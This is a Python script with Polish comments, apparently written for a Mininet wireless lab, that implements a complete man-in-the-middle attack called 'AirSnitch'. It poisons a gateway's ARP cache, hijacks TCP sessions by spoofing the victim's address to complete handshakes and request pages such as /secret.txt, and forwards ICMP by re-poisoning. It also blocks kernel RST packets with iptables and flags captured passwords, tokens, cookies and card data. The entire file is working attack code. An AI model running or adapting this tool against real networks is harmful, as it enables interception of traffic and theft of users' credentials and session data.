#!/usr/bin/env python3
"""
============================================================
AirSnitch - Pełny atak Man-in-the-Middle (MitM)
ARP Poisoning + TCP Session Hijacking + Gateway Bouncing
============================================================

Łańcuch ataku:
    1. ARP Poisoning bramy → przechwycenie downlinku ofiary
    2. TCP Session Hijacking → przechwycenie danych HTTP (hasła!)
    3. Gateway Bouncing → przekazanie ICMP z powrotem do ofiary

Kluczowa różnica vs. zwykły MitM:
    Dla TCP (HTTP): Atakujący SAM kończy handshake TCP i wysyła
    żądanie HTTP, udając ofiarę. ARP NIGDY nie jest odtruwany,
    więc odpowiedź z danymi ZAWSZE trafia do atakującego.

    Dla ICMP: Gateway Bouncing (odtrucie → przekazanie → zatrucie)

Uruchomienie:
    atk1 python3 airsnitch_mitm.py

Zatrzymanie: Ctrl+C
"""

from scapy.all import (
    Ether, ARP, IP, TCP, UDP, ICMP, Raw,
    sendp, sniff, wrpcap, conf
)
import subprocess
import threading
import signal
import time
import sys
import atexit
from collections import deque

# ╔══════════════════════════════════════════════════════════╗
# ║                  KONFIGURACJA SIECI                      ║
# ╚══════════════════════════════════════════════════════════╝
GW_IP       = "192.168.10.1"
GW_MAC      = "00:00:00:00:00:FF"
VICTIM_IP   = "192.168.10.2"
VICTIM_MAC  = "00:00:00:00:00:01"
ATK_IP      = "192.168.10.4"
ATK_MAC     = "00:00:00:00:00:66"

FORWARD_ICMP = True    # Czy przekazywać ICMP ofierze (Gateway Bounce)
LOG_DATA     = True    # Czy logować zawartość pakietów


def get_wlan_interface():
    result = subprocess.run(
        ['ip', '-o', 'link', 'show'], capture_output=True, text=True
    )
    for line in result.stdout.strip().split('\n'):
        parts = line.split(':')
        if len(parts) >= 2:
            iface = parts[1].strip().split('@')[0]
            if 'wlan' in iface:
                return iface
    return 'atk1-wlan0'


IFACE = get_wlan_interface()
conf.verb = 0
PCAP_PATH = '/tmp/airsnitch_mitm.pcap'

# ── Stan ataku ──
running = True
captured = []
forwarded_count = 0
intercepted_count = 0
hijacked_count = 0
forward_queue = deque(maxlen=100)
last_flush_count = 0

# ── TCP Session Hijacking ──
hijacked_sessions = {}  # {(victim_port, server_port): True}


def flush_pcap():
    """Zapisz przechwycone pakiety do PCAP (wywoływane co 10 pkt i na zakończenie)"""
    global last_flush_count
    if captured and len(captured) > last_flush_count:
        try:
            wrpcap(PCAP_PATH, captured)
            last_flush_count = len(captured)
        except Exception:
            pass


atexit.register(flush_pcap)


def signal_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


# ╔══════════════════════════════════════════════════════════╗
# ║           MODUŁ 1: ARP POISONING                         ║
# ╚══════════════════════════════════════════════════════════╝

def arp_poison_loop():
    """Ciągłe zatruwanie ARP bramy (co 1 sekundę)"""
    poison = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        ARP(op="is-at", psrc=VICTIM_IP, hwsrc=ATK_MAC,
            pdst=GW_IP, hwdst=GW_MAC)
    )
    while running:
        sendp(poison, iface=IFACE, verbose=False)
        time.sleep(1)


def arp_restore():
    """Przywrócenie prawidłowego ARP"""
    restore = (
        Ether(src=VICTIM_MAC, dst=GW_MAC) /
        ARP(op="is-at", psrc=VICTIM_IP, hwsrc=VICTIM_MAC,
            pdst=GW_IP, hwdst=GW_MAC)
    )
    for _ in range(5):
        sendp(restore, iface=IFACE, verbose=False)
        time.sleep(0.3)


# ╔══════════════════════════════════════════════════════════╗
# ║     MODUŁ 2: TCP SESSION HIJACKING                      ║
# ╚══════════════════════════════════════════════════════════╝

def tcp_hijack(pkt):
    """
    TCP Session Hijacking — przechwycenie sesji TCP ofiary.

    Gdy brama wysyła SYN-ACK do ofiary (ale trafia do nas dzięki
    ARP Poisoning), SAMI kończymy handshake TCP i wysyłamy żądanie
    HTTP, udając ofiarę.

    Kluczowa zaleta: ARP NIGDY nie jest odtruwany!
    Brama cały czas myśli, że ofiara to MY, więc odpowiedź HTTP
    (z hasłami, danymi) ZAWSZE trafia do atakującego.
    """
    global hijacked_count

    if TCP not in pkt or IP not in pkt:
        return

    tcp = pkt[TCP]
    ip = pkt[IP]

    # Reaguj tylko na SYN-ACK (flagi = SA = 0x12)
    if tcp.flags != 0x12:
        return

    # Sprawdź czy to połączenie na port HTTP
    if tcp.sport != 80:
        return

    session_key = (tcp.dport, tcp.sport)  # (victim_port, server_port)

    # Nie hijackuj tej samej sesji dwa razy
    if session_key in hijacked_sessions:
        return

    hijacked_sessions[session_key] = True
    hijacked_count += 1

    # ── Oblicz numery sekwencyjne TCP ──
    our_seq = tcp.ack          # Serwer oczekuje tego seq od "klienta"
    our_ack = tcp.seq + 1      # My potwierdzamy SYN serwera

    victim_port = tcp.dport
    server_port = tcp.sport

    print(f"\n  {'═' * 55}")
    print(f"  🔓 TCP SESSION HIJACKING")
    print(f"  {'═' * 55}")
    print(f"  Przechwycono SYN-ACK: {ip.src}:{server_port} → {ip.dst}:{victim_port}")
    print(f"  Atakujący przejmuje sesję TCP ofiary...")

    # ── Krok 1: Wyślij ACK (zakończ handshake TCP) ──
    ack_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=GW_IP) /
        TCP(sport=victim_port, dport=server_port,
            flags='A', seq=our_seq, ack=our_ack,
            window=43440)
    )
    sendp(ack_pkt, iface=IFACE, verbose=False)
    captured.append(ack_pkt)
    print(f"  ✓ ACK wysłany → Handshake TCP zakończony!")

    # ── Krok 2: Wyślij żądanie HTTP GET / ──
    http_request = (
        f"GET / HTTP/1.0\r\n"
        f"Host: {GW_IP}\r\n"
        f"User-Agent: AirSnitch-Hijack\r\n"
        f"\r\n"
    )
    get_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=GW_IP) /
        TCP(sport=victim_port, dport=server_port,
            flags='PA', seq=our_seq, ack=our_ack,
            window=43440) /
        Raw(load=http_request)
    )
    sendp(get_pkt, iface=IFACE, verbose=False)
    captured.append(get_pkt)
    print(f"  📤 HTTP GET / wysłany (jako {VICTIM_IP})")
    print(f"  🔑 Oczekiwanie na odpowiedź z danymi...")
    print(f"  {'═' * 55}\n")

    # ── Krok 3 (opcjonalnie): Wyślij drugi GET po /secret.txt ──
    # Używamy nowego portu źródłowego, więc to nowa sesja TCP
    time.sleep(0.3)
    _hijack_secret_txt()


def _hijack_secret_txt():
    """Inicjuj własne połączenie TCP do bramy i pobierz /secret.txt"""
    import random
    sport = random.randint(50000, 60000)

    # Wyślij SYN
    syn_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=GW_IP) /
        TCP(sport=sport, dport=80,
            flags='S', seq=1000, window=43440)
    )
    sendp(syn_pkt, iface=IFACE, verbose=False)
    captured.append(syn_pkt)

    # Oznacz tę sesję jako "oczekująca na SYN-ACK"
    hijacked_sessions[(sport, 80)] = 'pending_secret'


def tcp_hijack_pending(pkt):
    """
    Obsługa sesji 'pending_secret' — gdy dostaniemy SYN-ACK
    na naszą własną sesję TCP, dokończ handshake i pobierz /secret.txt
    """
    if TCP not in pkt or IP not in pkt:
        return False

    tcp = pkt[TCP]
    if tcp.flags != 0x12:  # SYN-ACK
        return False

    session_key = (tcp.dport, tcp.sport)
    if session_key not in hijacked_sessions:
        return False
    if hijacked_sessions[session_key] != 'pending_secret':
        return False

    hijacked_sessions[session_key] = True

    our_seq = tcp.ack
    our_ack = tcp.seq + 1

    # ACK
    ack_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=GW_IP) /
        TCP(sport=tcp.dport, dport=tcp.sport,
            flags='A', seq=our_seq, ack=our_ack, window=43440)
    )
    sendp(ack_pkt, iface=IFACE, verbose=False)
    captured.append(ack_pkt)

    # GET /secret.txt
    http_req = (
        f"GET /secret.txt HTTP/1.0\r\n"
        f"Host: {GW_IP}\r\n"
        f"User-Agent: AirSnitch-Hijack\r\n"
        f"\r\n"
    )
    get_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=VICTIM_IP, dst=GW_IP) /
        TCP(sport=tcp.dport, dport=tcp.sport,
            flags='PA', seq=our_seq, ack=our_ack, window=43440) /
        Raw(load=http_req)
    )
    sendp(get_pkt, iface=IFACE, verbose=False)
    captured.append(get_pkt)
    print(f"  📤 HTTP GET /secret.txt wysłany (sesja #{tcp.dport})")

    return True


# ╔══════════════════════════════════════════════════════════╗
# ║     MODUŁ 3: GATEWAY BOUNCING (tylko ICMP)              ║
# ╚══════════════════════════════════════════════════════════╝

def forward_via_gateway_bounce(original_pkt):
    """
    Przekaż przechwycony pakiet ICMP do ofiary przez Gateway Bouncing.
    Używane TYLKO dla ICMP — TCP jest obsługiwany przez Session Hijacking.
    """
    global forwarded_count

    restore_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        ARP(op="is-at", psrc=VICTIM_IP, hwsrc=VICTIM_MAC,
            pdst=GW_IP, hwdst=GW_MAC)
    )
    sendp(restore_pkt, iface=IFACE, verbose=False)

    if IP in original_pkt:
        fwd_pkt = (
            Ether(src=ATK_MAC, dst=GW_MAC) /
            original_pkt[IP]
        )
        sendp(fwd_pkt, iface=IFACE, verbose=False)
        forwarded_count += 1

    # Ponowne zatrucie ARP
    poison_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        ARP(op="is-at", psrc=VICTIM_IP, hwsrc=ATK_MAC,
            pdst=GW_IP, hwdst=GW_MAC)
    )
    sendp(poison_pkt, iface=IFACE, verbose=False)


def forwarder_loop():
    """Wątek przekazujący pakiety ICMP z kolejki"""
    global running
    while running:
        if forward_queue:
            pkt = forward_queue.popleft()
            try:
                forward_via_gateway_bounce(pkt)
            except Exception as e:
                print(f"  [!] Błąd przekazywania: {e}")
        else:
            time.sleep(0.01)


# ╔══════════════════════════════════════════════════════════╗
# ║     MODUŁ 4: ANALIZA I PRZECHWYTYWANIE                  ║
# ╚══════════════════════════════════════════════════════════╝

def analyze_packet(pkt):
    """Analiza i logowanie przechwyconego pakietu"""
    global intercepted_count

    if IP not in pkt:
        return
    if Ether not in pkt:
        return

    ip = pkt[IP]

    # Ignoruj nasze własne pakiety i ARP
    if ip.src == ATK_IP:
        return
    if ARP in pkt:
        return

    # Sprawdź czy to pakiet przechwycony (dst MAC = nasz)
    if pkt[Ether].dst != ATK_MAC:
        return

    # Sprawdź czy to SYN-ACK na naszą sesję "pending_secret"
    if tcp_hijack_pending(pkt):
        intercepted_count += 1
        captured.append(pkt)
        return

    intercepted_count += 1
    captured.append(pkt)

    # Okresowy zapis PCAP (co 5 pakietów)
    if intercepted_count % 5 == 0:
        flush_pcap()

    # ── Wyświetl informacje o pakiecie ──
    proto_name = "???"
    detail = ""

    if ICMP in pkt:
        proto_name = "ICMP"
        detail = f"type={pkt[ICMP].type}"
    elif TCP in pkt:
        proto_name = "TCP"
        flags = str(pkt[TCP].flags)
        detail = f"{pkt[TCP].sport}→{pkt[TCP].dport} [{flags}]"
    elif UDP in pkt:
        proto_name = "UDP"
        detail = f"{pkt[UDP].sport}→{pkt[UDP].dport}"

    # Oznacz typ akcji
    if TCP in pkt and pkt[TCP].flags == 0x12:
        action = "→HIJACK"
    elif ICMP in pkt and FORWARD_ICMP:
        action = "→FWD"
    elif TCP in pkt:
        action = "→CAPTURED"
    else:
        action = ""

    print(f"  [{intercepted_count:4d}] "
          f"{ip.src:>15s} ──> {ip.dst:<15s} "
          f"| {proto_name:5s} | {detail} {action}")

    # ── Logowanie danych (payload) ──
    if LOG_DATA and Raw in pkt:
        try:
            data = pkt[Raw].load
            text = data.decode('utf-8', errors='replace')[:300]
            if any(c.isalnum() for c in text):
                # Podświetl wrażliwe dane
                sensitive_words = ['haslo', 'password', 'login', 'token',
                                   'secret', 'cookie', 'session', 'admin',
                                   'Hotel', 'kart', 'kredyt', 'TAJNE']
                is_sensitive = any(w in text for w in sensitive_words)
                if is_sensitive:
                    print(f"         ┌─────────────────────────────────────────────")
                    print(f"         │ 🔴 PRZECHWYCONE WRAŻLIWE DANE:")
                    for line in text.split('\n'):
                        line = line.strip()
                        if line:
                            print(f"         │   {line[:120]}")
                    print(f"         └─────────────────────────────────────────────")
                else:
                    print(f"         └─ 📦 Dane: {text[:150]}")
        except Exception:
            pass

    # ── Routing: TCP → Hijacking, ICMP → Gateway Bounce ──
    if TCP in pkt:
        tcp_hijack(pkt)  # Hijack SYN-ACK (jeśli to SYN-ACK)
        # NIE przekazuj TCP przez Gateway Bounce!
    elif ICMP in pkt and FORWARD_ICMP:
        forward_queue.append(pkt.copy())


# ╔══════════════════════════════════════════════════════════╗
# ║                    GŁÓWNY PROGRAM                        ║
# ╚══════════════════════════════════════════════════════════╝

def main():
    global running

    print("╔══════════════════════════════════════════════════════════╗")
    print("║   AirSnitch - MitM + TCP Session Hijacking             ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║  ARP Poisoning (przechwycenie downlinku)               ║")
    print("║  + TCP Session Hijacking (kradzież danych HTTP)        ║")
    print("║  + Gateway Bouncing (przekazanie ICMP)                 ║")
    print("╚══════════════════════════════════════════════════════════╝")

    print(f"\n[*] Konfiguracja:")
    print(f"    Interfejs       : {IFACE}")
    print(f"    Brama           : {GW_IP} ({GW_MAC})")
    print(f"    Ofiara          : {VICTIM_IP} ({VICTIM_MAC})")
    print(f"    Atakujący       : {ATK_IP} ({ATK_MAC})")

    print(f"\n[*] Schemat ataku:")
    print(f"")
    print(f"    sta1 (Ofiara)          atk1 (Atakujący)         Brama")
    print(f"         │                      │                    │")
    print(f"         │ ── SYN ───────────────────────────────> │")
    print(f"         │                      │ <── SYN-ACK ──── │")
    print(f"         │                      │  (ARP zatruty!)    │")
    print(f"         │                      │                    │")
    print(f"         │    [HIJACK!]         │ ── ACK + GET / ─> │")
    print(f"         │                      │  (udajemy ofiarę!) │")
    print(f"         │                      │                    │")
    print(f"         │                      │ <── HTTP 200 ──── │")
    print(f"         │                      │  🔑 HASŁA, DANE   │")
    print(f"")

    # ── Blokada RST z kernela ──
    # Kernel wysyłałby RST dla sesji TCP, których nie zna
    # (bo to MY obsługujemy handshake przez scapy, nie kernel)
    print(f"[*] Blokowanie pakietów RST z kernela...")
    subprocess.run(
        ['iptables', '-C', 'OUTPUT', '-p', 'tcp',
         '--tcp-flags', 'RST', 'RST', '-j', 'DROP'],
        capture_output=True
    )
    subprocess.run(
        ['iptables', '-A', 'OUTPUT', '-p', 'tcp',
         '--tcp-flags', 'RST', 'RST', '-j', 'DROP'],
        capture_output=True
    )
    print(f"[+] RST zablokowane ✓")

    # ── Uruchomienie wątków ──
    print(f"[*] Uruchamianie modułów ataku...")

    # Wątek 1: ARP Poisoning
    poison_thread = threading.Thread(target=arp_poison_loop, daemon=True)
    poison_thread.start()
    print(f"[+] Moduł ARP Poisoning ✓")

    # Wątek 2: ICMP Forwarder (Gateway Bouncing)
    if FORWARD_ICMP:
        fwd_thread = threading.Thread(target=forwarder_loop, daemon=True)
        fwd_thread.start()
        print(f"[+] Moduł Gateway Bounce (ICMP) ✓")

    print(f"[+] Moduł TCP Session Hijacking ✓")

    time.sleep(2)
    print(f"[+] Atak MitM aktywny!")

    print(f"\n[*] W osobnym terminalu Mininet uruchom:")
    print(f"    sta1 ping -c 5 192.168.10.1")
    print(f"    sta1 curl http://192.168.10.1/")
    print(f"    sta1 wget -qO- http://192.168.10.1/secret.txt")
    print(f"\n[*] Naciśnij Ctrl+C aby zakończyć atak\n")
    print(f"{'─' * 65}")

    # ── Nasłuchiwanie pakietów ──
    try:
        while running:
            sniff(
                iface=IFACE,
                prn=analyze_packet,
                store=0,
                timeout=1,
                stop_filter=lambda p: not running
            )
    except KeyboardInterrupt:
        pass
    finally:
        running = False

        # ── Przywrócenie ARP ──
        arp_restore()

        # ── Usunięcie reguły iptables ──
        subprocess.run(
            ['iptables', '-D', 'OUTPUT', '-p', 'tcp',
             '--tcp-flags', 'RST', 'RST', '-j', 'DROP'],
            capture_output=True
        )

        # ── Raport końcowy ──
        print(f"\n{'═' * 65}")
        print(f"  RAPORT ATAKU MAN-IN-THE-MIDDLE")
        print(f"{'═' * 65}")
        print(f"  Przechwyconych pakietów  : {intercepted_count}")
        print(f"  Przejętych sesji TCP     : {hijacked_count}")
        print(f"  Przekazanych ICMP        : {forwarded_count}")

        # ── Zapis do PCAP ──
        flush_pcap()
        if captured:
            print(f"\n  [+] PCAP zapisany ({len(captured)} pkt): {PCAP_PATH}")
            print(f"  [+] Analiza: wireshark {PCAP_PATH}")

        print(f"\n  Techniki użyte w ataku:")
        print(f"    1. ARP Cache Poisoning bramy (przechwycenie downlinku)")
        print(f"    2. TCP Session Hijacking (kradzież danych HTTP)")
        print(f"    3. Gateway Bouncing (przekazanie ICMP ofierze)")
        print(f"{'═' * 65}\n")


if __name__ == '__main__':
    main()
